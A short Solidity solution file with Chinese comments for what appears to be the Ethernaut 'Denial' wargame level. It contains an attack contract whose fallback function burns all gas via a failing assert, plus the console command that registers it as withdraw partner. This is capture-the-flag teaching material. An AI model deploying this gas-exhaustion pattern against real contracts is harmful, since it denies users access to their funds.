// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

// 这是一个有足够资金的简单钱包合约，你可以通过成为partner来提取其中的资金。
// 通关条件：拒绝owner成功提取其中资金当他们调用withdraw()方法（同时合约里还有足够资金，并且交易gas少于1M）。


// solved:
// 如果未指定固定数量的gas，外部调用未知合约仍然可以造成合约拒绝服务攻击。

contract DenialAttack {
    fallback() external payable {
        // consume all the gas
        assert(1 == 2);
    }
}


// solve: await contract.setWithdrawPartner("0x27424FD66264e43aF71BbaD1Dd41F4863034D9eC");
